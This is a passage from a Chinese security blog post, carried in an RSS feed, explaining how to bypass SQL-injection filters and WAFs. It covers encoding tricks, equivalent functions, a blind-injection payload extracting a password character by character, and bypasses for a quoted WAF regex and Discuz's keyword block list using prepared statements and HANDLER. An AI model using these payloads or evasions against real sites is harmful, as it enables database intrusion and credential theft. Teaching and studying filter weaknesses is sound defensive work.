</code></pre></td></tr></table>
</div>
</div><blockquote>
<p>VALUES和TABLES语句的结果都是表数据，可以结合起来使用</p>
</blockquote>
<h2 id="使用编码绕过过滤">使用<strong>编码</strong>绕过过滤</h2>
<p>如<code>URLEncode</code>编码，<code>ASCII</code>,<code>HEX</code>,<code>unicode</code>编码绕过</p>
<p><code>or 1=1</code>即<code>%6f%72%20%31%3d%31</code>，而<code>Test</code>也可以为<code>CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)</code></p>
<h2 id="使用等价函数绕过过滤">使用<strong>等价函数</strong>绕过过滤</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="n">hex</span><span class="p">()</span><span class="err">、</span><span class="n">bin</span><span class="p">()</span> <span class="o">==&gt;</span> <span class="n">ascii</span><span class="p">()</span>

<span class="n">sleep</span><span class="p">()</span> <span class="o">==&gt;</span><span class="n">benchmark</span><span class="p">()</span>

<span class="n">concat_ws</span><span class="p">()</span><span class="o">==&gt;</span><span class="n">group_concat</span><span class="p">()</span>

<span class="n">mid</span><span class="p">()</span><span class="err">、</span><span class="n">substr</span><span class="p">()</span> <span class="o">==&gt;</span> <span class="k">substring</span><span class="p">()</span>

<span class="o">@@</span><span class="k">user</span> <span class="o">==&gt;</span> <span class="k">user</span><span class="p">()</span>

<span class="o">@@</span><span class="n">datadir</span> <span class="o">==&gt;</span> <span class="n">datadir</span><span class="p">()</span>

<span class="err">举例：</span><span class="k">substring</span><span class="p">()</span><span class="err">和</span><span class="n">substr</span><span class="p">()</span><span class="err">无法使用时：</span><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="o">+</span><span class="k">and</span><span class="o">+</span><span class="n">ascii</span><span class="p">(</span><span class="k">lower</span><span class="p">(</span><span class="n">mid</span><span class="p">((</span><span class="k">select</span><span class="o">+</span><span class="n">pwd</span><span class="o">+</span><span class="k">from</span><span class="o">+</span><span class="n">users</span><span class="o">+</span><span class="k">limit</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)))</span><span class="o">=</span><span class="mi">74</span>　

<span class="err">或者：</span>
<span class="n">substr</span><span class="p">((</span><span class="k">select</span> <span class="s1">&#39;password&#39;</span><span class="p">),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span> <span class="o">=</span> <span class="mi">0</span><span class="n">x70</span>
<span class="n">strcmp</span><span class="p">(</span><span class="k">left</span><span class="p">(</span><span class="s1">&#39;password&#39;</span><span class="p">,</span><span class="mi">1</span><span class="p">),</span> <span class="mi">0</span><span class="n">x69</span><span class="p">)</span> <span class="o">=</span> <span class="mi">1</span>
<span class="n">strcmp</span><span class="p">(</span><span class="k">left</span><span class="p">(</span><span class="s1">&#39;password&#39;</span><span class="p">,</span><span class="mi">1</span><span class="p">),</span> <span class="mi">0</span><span class="n">x70</span><span class="p">)</span> <span class="o">=</span> <span class="mi">0</span>
<span class="n">strcmp</span><span class="p">(</span><span class="k">left</span><span class="p">(</span><span class="s1">&#39;password&#39;</span><span class="p">,</span><span class="mi">1</span><span class="p">),</span> <span class="mi">0</span><span class="n">x71</span><span class="p">)</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span>
</code></pre></td></tr></table>
</div>
</div><h2 id="补充进行过滤的几种思路">补充：进行过滤的几种思路</h2>
<h3 id="黑名单字符替换">黑名单字符替换</h3>
<p>这种是最简单的，针对某些黑名单关键字，直接进行 str_replace</p>
<p>如果替换的不完全，可以用 <code>selselectect</code> 来替换 <code>select</code> 绕过</p>
<h3 id="正则匹配">正则匹配</h3>
<p>在一些waf或者cms会见到类似如下的防护代码</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-php" data-lang="php"><span class="nv">$filter</span> <span class="o">=</span> <span class="s2">&#34;</span><span class="se">\\</span><span class="s2">&lt;.+javascript:window</span><span class="se">\\</span><span class="s2">[.{1}</span><span class="se">\\\\</span><span class="s2">x|&lt;.*=(&amp;#</span><span class="se">\\</span><span class="s2">d+?;?)+?&gt;|&lt;.*(data|src)=data:text</span><span class="se">\\</span><span class="s2">/html.*&gt;|</span><span class="se">\\</span><span class="s2">b(alert</span><span class="se">\\</span><span class="s2">(|confi
</span><span class="s2">rm</span><span class="se">\\</span><span class="s2">(|expression</span><span class="se">\\</span><span class="s2">(|prompt</span><span class="se">\\</span><span class="s2">(|benchmark\s*?\(.*\)|sleep\s*?\(.*\)|load_file\s*?</span><span class="se">\\</span><span class="s2">()|&lt;[a-z]+?</span><span class="se">\\</span><span class="s2">b[^&gt;]*?</span><span class="se">\\</span><span class="s2">bon([a-z]{4,})
</span><span class="s2">\s*?=|^</span><span class="se">\\</span><span class="s2">+</span><span class="se">\\</span><span class="s2">/v(8|9)|</span><span class="se">\\</span><span class="s2">b(and|or)</span><span class="se">\\</span><span class="s2">b</span><span class="se">\\</span><span class="s2">s*?([</span><span class="se">\\</span><span class="s2">(</span><span class="se">\\</span><span class="s2">)&#39;</span><span class="se">\&#34;\\</span><span class="s2">d]+?=[</span><span class="se">\\</span><span class="s2">(</span><span class="se">\\</span><span class="s2">)&#39;</span><span class="se">\&#34;\\</span><span class="s2">d]+?|[</span><span class="se">\\</span><span class="s2">(</span><span class="se">\\</span><span class="s2">)&#39;</span><span class="se">\&#34;</span><span class="s2">a-zA-Z]+?=[</span><span class="se">\\</span><span class="s2">(</span><span class="se">\\</span><span class="s2">)&#39;</span><span class="se">\&#34;</span><span class="s2">a-zA-Z]+?|&gt;|&lt;
</span><span class="s2">|\s+?[</span><span class="se">\\</span><span class="s2">w]+?</span><span class="se">\\</span><span class="s2">s+?</span><span class="se">\\</span><span class="s2">bin</span><span class="se">\\</span><span class="s2">b</span><span class="se">\\</span><span class="s2">s*?\(|</span><span class="se">\\</span><span class="s2">blike</span><span class="se">\\</span><span class="s2">b</span><span class="se">\\</span><span class="s2">s+?[</span><span class="se">\&#34;</span><span class="s2">&#39;])|</span><span class="se">\\</span><span class="s2">/</span><span class="se">\\</span><span class="s2">*.*</span><span class="se">\\</span><span class="s2">*</span><span class="se">\\</span><span class="s2">/|&lt;</span><span class="se">\\</span><span class="s2">s*script</span><span class="se">\\</span><span class="s2">b|</span><span class="se">\\</span><span class="s2">bEXEC</span><span class="se">\\</span><span class="s2">b|UNION.+?SELECT(\(|@{1
</span><span class="s2">,2}\w+?\s*|\s+?.+?|.*(`|&#39;|</span><span class="se">\&#34;</span><span class="s2">).+(`|&#39;|</span><span class="se">\&#34;</span><span class="s2">)\s*)|UPDATE\s*(\(.+\)\s*|@{1,2}.+?\s*|\s+?.+?|(`|&#39;|</span><span class="se">\&#34;</span><span class="s2">).*?(`|&#39;|</span><span class="se">\&#34;</span><span class="s2">)\s*)SET|INSER
</span><span class="s2">T</span><span class="se">\\</span><span class="s2">s+INTO.+?VALUES|(SELECT|DELETE).+?FROM\s+?|(CREATE|ALTER|DROP|TRUNCATE)</span><span class="se">\\</span><span class="s2">s+(TABLE|DATABASE)|FROM\s.?|\(select|\(\s
</span><span class="s2">select|\bunion\b|select\s.+?&#34;</span><span class="p">;</span>
</code></pre></td></tr></table>
</div>
</div><p>这里面匹配了各种模式的注入语句，但是还是可以绕过的</p>
<p>比如说 <code>INSERT\\s+INTO.+?VALUES</code> 可以使用 <code>insert into xxx select</code> 的方式进行绕过</p>
<p>在经过不断的更新换代升级之后，产生了一些非常经典的正则，主要考虑到注入获取数据的时候需要联合查询或者子查询来完成</p>
<p>例如discuz的防护代码 <code>_do_query_safe</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-php" data-lang="php"><span class="nv">$_config</span><span class="p">[</span><span class="s1">&#39;security&#39;</span><span class="p">][</span><span class="s1">&#39;querysafe&#39;</span><span class="p">][</span><span class="s1">&#39;dfunction&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;load_file&#39;</span><span class="p">,</span><span class="s1">&#39;hex&#39;</span><span class="p">,</span><span class="s1">&#39;substring&#39;</span><span class="p">,</span><span class="s1">&#39;if&#39;</span><span class="p">,</span><span class="s1">&#39;ord&#39;</span><span class="p">,</span><span class="s1">&#39;char&#39;</span><span class="p">);</span>
<span class="nv">$_config</span><span class="p">[</span><span class="s1">&#39;security&#39;</span><span class="p">][</span><span class="s1">&#39;querysafe&#39;</span><span class="p">][</span><span class="s1">&#39;daction&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;@&#39;</span><span class="p">,</span><span class="s1">&#39;intooutfile&#39;</span><span class="p">,</span><span class="s1">&#39;intodumpfile&#39;</span><span class="p">,</span><span class="s1">&#39;unionselect&#39;</span><span class="p">,</span><span class="s1">&#39;(select&#39;</span><span class="p">,</span> <span class="s1">&#39;un
</span><span class="s1">ionall&#39;</span><span class="p">,</span> <span class="s1">&#39;uniondistinct&#39;</span><span class="p">);</span>
<span class="nv">$_config</span><span class="p">[</span><span class="s1">&#39;security&#39;</span><span class="p">][</span><span class="s1">&#39;querysafe&#39;</span><span class="p">][</span><span class="s1">&#39;dnote&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;/*&#39;</span><span class="p">,</span><span class="s1">&#39;*/&#39;</span><span class="p">,</span><span class="s1">&#39;#&#39;</span><span class="p">,</span><span class="s1">&#39;--&#39;</span><span class="p">,</span><span class="s1">&#39;&#34;&#39;</span><span class="p">);</span>
<span class="o">...</span>
<span class="nv">$clean</span> <span class="o">=</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="s2">&#34;/[^a-z0-9_\-\(\)#\*\/</span><span class="se">\&#34;</span><span class="s2">]+/is&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nx">strtolower</span><span class="p">(</span><span class="nv">$clean</span><span class="p">));</span>
<span class="o">...</span>
<span class="k">if</span> <span class="p">(</span><span class="nx">is_array</span><span class="p">(</span><span class="nx">self</span><span class="o">::</span><span class="nv">$config</span><span class="p">[</span><span class="s1">&#39;dfunction&#39;</span><span class="p">]))</span> <span class="p">{</span>
    <span class="k">foreach</span> <span class="p">(</span><span class="nx">self</span><span class="o">::</span><span class="nv">$config</span><span class="p">[</span><span class="s1">&#39;dfunction&#39;</span><span class="p">]</span> <span class="k">as</span> <span class="nv">$fun</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="nx">strpos</span><span class="p">(</span><span class="nv">$clean</span><span class="p">,</span> <span class="nv">$fun</span> <span class="o">.</span> <span class="s1">&#39;(&#39;</span><span class="p">)</span> <span class="o">!==</span> <span class="k">false</span><span class="p">)</span>
            <span class="k">return</span> <span class="s1">&#39;-1&#39;</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>这段代码首先将sql语句除了<code>a-z``0-9</code>和几个有限的字符外的其他所有字符替换为空，然后对其进行匹配，如果能够匹配到类似<code>unionall</code>、<code>(select</code>这样的获取数据所要用到的代码，就拒绝执行</p>
<p>但是即便是这样也还可以绕过，比如同表注入就不需要用到子查询</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">test</span> <span class="k">where</span> <span class="n">test3</span><span class="o">=-</span><span class="mi">1</span> <span class="k">or</span> <span class="n">substr</span><span class="p">(</span><span class="n">test2</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span><span class="o">=</span><span class="mi">1</span>
</code></pre></td></tr></table>
</div>
</div><p>或者可以使用多语句的方式执行</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="k">set</span> <span class="o">@</span><span class="n">a</span><span class="p">:</span><span class="o">=</span><span class="mi">0</span><span class="n">x73656c656374202a2066726f6d2074657374</span><span class="p">;</span>
<span class="k">prepare</span> <span class="n">s</span> <span class="k">from</span> <span class="o">@</span><span class="n">a</span><span class="p">;</span>
<span class="k">execute</span> <span class="n">s</span><span class="p">;</span>
</code></pre></td></tr></table>
</div>
</div><p>也可以</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="k">handler</span> <span class="k">user</span> <span class="k">open</span><span class="p">;</span>
<span class="k">handler</span> <span class="k">user</span> <span class="k">read</span> <span class="k">first</span><span class="p">;</span>
</code></pre></td></tr></table>
</div>
</div><h3 id="语义分析">语义分析</h3>
<p>这是最高级的方式，模仿mysql对sql的分析，waf对用户的输入进行语法语义分析，如果符合mysql的语法，就判断为sql注入从而阻断</p>
<p>这种防护的绕过思路就是找特殊的语法，这些特殊语法waf可能没有覆盖全面，从而导致waf语义分析失败，从而进行绕过</p>
<p>例如我们上面说的mysql8的tables和values语句就是比较新的语法，有很多waf还米有覆盖到</p>]]></description></item></channel></rss>